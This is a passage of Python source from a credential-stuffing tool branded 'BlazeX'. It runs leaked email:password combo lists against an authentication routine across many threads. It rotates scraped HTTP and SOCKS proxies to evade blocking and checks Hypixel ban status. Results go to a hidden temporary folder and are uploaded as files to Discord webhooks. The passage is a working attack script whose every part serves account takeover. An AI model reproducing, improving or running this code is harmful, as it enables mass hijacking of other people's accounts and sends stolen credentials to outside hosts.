                    specific_webhook = file_webhooks.get(file, default_file_webhook) if relative_path == "." else folder_webhooks.get(relative_path.split(os.sep)[0], default_file_webhook)
                    try:
                        with open(file_path, 'rb') as f:
                            files_data = {'file': (file, f)}
                            payload = {"content": message}
                            response = requests.post(specific_webhook, data=payload, files=files_data, timeout=30)
                    except Exception as e:
                        pass

        try:
            response = requests.post(completion_webhook, json={"content": f"File checking completed by {RESTOCKER_NAME} ✅"}, timeout=10)
        except Exception as e:
            pass
    else:
        print(Fore.YELLOW + "Default file webhook not set. Skipping upload.")

    try:
        shutil.rmtree(temp_dir)
        print(Fore.CYAN + "Temporary directory cleaned up.")
    except Exception as e:
        print(Fore.YELLOW + f"Warning: Failed to delete temporary directory: {e}")

    print(Fore.LIGHTRED_EX + "Press any key to exit.")
    repr(readchar.readkey())

def getproxy():
    if proxytype == "'5'": return random.choice(proxylist)
    if proxytype != "'4'":
        proxy = random.choice(proxylist)
        if proxytype == "'1'": return {'http': 'http://' + proxy, 'https': 'http://' + proxy}
        elif proxytype == "'2'": return {'http': 'socks4://' + proxy, 'https': 'socks4://' + proxy}
        elif proxytype == "'3'": return {'http': 'socks5://' + proxy, 'https': 'socks5://' + proxy}
    else: return None

def Checker(combo):
    global bad, checked, cpm
    try:
        decoded_combo = decode_combo(combo.strip())
        split = decoded_combo.split(":")
        if len(split) != 2:
            raise ValueError("Invalid combo format after decoding")
        email = split[0]
        password = split[1]
        if email and password:
            authenticate(email, password)
        else:
            raise ValueError("Empty email or password after decoding")
    except Exception as e:
        print(Fore.YELLOW + f"Error in Checker for {combo}: {e}")
        if screen == "'2'": print(Fore.RED + f"Bad: {combo.strip()}")
        with open(os.path.join(results_dir, "Bad.txt"), 'a') as f:
            f.write(f"{combo.strip()}\n")
        bad += 1
        cpm += 1
        checked += 1

def get_proxies():
    global proxylist
    http = []
    socks4 = []
    socks5 = []
    api_http = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=http&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt"
    ]
    api_socks4 = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks4&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt"
    ]
    api_socks5 = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks5&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt"
    ]
    for service in api_http:
        http.extend(requests.get(service).text.splitlines())
    for service in api_socks4:
        socks4.extend(requests.get(service).text.splitlines())
    for service in api_socks5:
        socks5.extend(requests.get(service).text.splitlines())
    try:
        for dta in requests.get("https://proxylist.geonode.com/api/proxy-list?protocols=socks4&limit=500").json().get('data'):
            socks4.append(f"{dta.get('ip')}:{dta.get('port')}")
    except: pass
    try:
        for dta in requests.get("https://proxylist.geonode.com/api/proxy-list?protocols=socks5&limit=500").json().get('data'):
            socks5.append(f"{dta.get('ip')}:{dta.get('port')}")
    except: pass
    http = list(set(http))
    socks4 = list(set(socks4))
    socks5 = list(set(socks5))
    proxylist.clear()
    for proxy in http: proxylist.append({'http': 'http://' + proxy, 'https': 'http://' + proxy})
    for proxy in socks4: proxylist.append({'http': 'socks4://' + proxy, 'https': 'socks4://' + proxy})
    for proxy in socks5: proxylist.append({'http': 'socks5://' + proxy, 'https': 'socks5://' + proxy})
    if screen == "'2'": print(Fore.LIGHTBLUE_EX + f'Scraped [{len(proxylist)}] proxies')
    time.sleep(config.get('autoscrape') * 60)
    get_proxies()

def banproxyload():
    global banproxies
    proxyfile = filedialog.askopenfile(mode='rb', title='Choose a SOCKS5 Proxy file', filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    if proxyfile is None:
        print(Fore.LIGHTRED_EX + "Invalid File.")
        time.sleep(2)
        Proxys()
    else:
        try:
            with open(proxyfile.name, 'r+', encoding='utf-8', errors='ignore') as e:
                ext = e.readlines()
                for line in ext:
                    try:
                        proxyline = line.split()[0].replace('\n', '')
                        banproxies.append(proxyline)
                    except: pass
            print(Fore.LIGHTBLUE_EX + f"Loaded [{len(banproxies)}] lines.")
            time.sleep(2)
        except Exception:
            print(Fore.LIGHTRED_EX + "Your file is probably harmed.")
            time.sleep(2)
            banproxyload()

def Main():
    global proxytype, screen, results_dir, temp_dir
    check_passkey()  # Check passkey before running
    check_for_updates()  # Check for updates
    utils.set_title("BlazeX by HarshOGG and SteveOG")
    os.system('cls')
    print(logo)
    try:
        print(Fore.LIGHTBLACK_EX + "Use max 10 threads")
        thread = int(input(Fore.LIGHTBLUE_EX + "Threads: "))
    except:
        print(Fore.LIGHTRED_EX + "Must be a number.")
        time.sleep(2)
        Main()
    print(Fore.LIGHTBLUE_EX + "Proxy Type: [1] Http/s - [2] Socks4 - [3] Socks5 - [4] None - [5] Auto Scraper")
    proxytype = repr(readchar.readkey())
    cleaned = int(proxytype.replace("'", ""))
    if cleaned not in range(1, 6):
        print(Fore.RED + f"Invalid Proxy Type [{cleaned}]")
        time.sleep(2)
        Main()
    if config.get('log'):
        screen = "'2'"
    else:
        screen = "'1'"
    print(Fore.LIGHTBLUE_EX + "Select your combos")
    Load()
    if proxytype != "'4'" and proxytype != "'5'":
        print(Fore.LIGHTBLUE_EX + "Select your proxies")
        JOB()
    if config.get('proxylessban') is False and config.get('hypixelban') is True:
        print(Fore.LIGHTBLUE_EX + "Select your SOCKS5 Ban Checking Proxies.")
        banproxyload()
    if proxytype == "'5'":
        print(Fore.LIGHTGREEN_EX + "Scraping Proxies Please Wait.")
        proxy_thread = threading.Thread(target=get_proxies)
        proxy_thread.daemon = True
        proxy_thread.start()
        while len(proxylist) == 0:
            time.sleep(1)

    temp_dir = tempfile.mkdtemp()
    hide_folder(temp_dir)
    results_dir = os.path.join(temp_dir, fname)
    os.makedirs(results_dir)
    hide_folder(results_dir)

    if screen == "'1'": cuiscreen()
    elif screen == "'2'": logscreen()
    else: cuiscreen()
    with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
        futures = [executor.submit(Checker, combo) for combo in Combos]
        concurrent.futures.wait(futures)
        executor.shutdown(wait=True)
    finishedscreen()

if __name__ == "__main__":
    Main()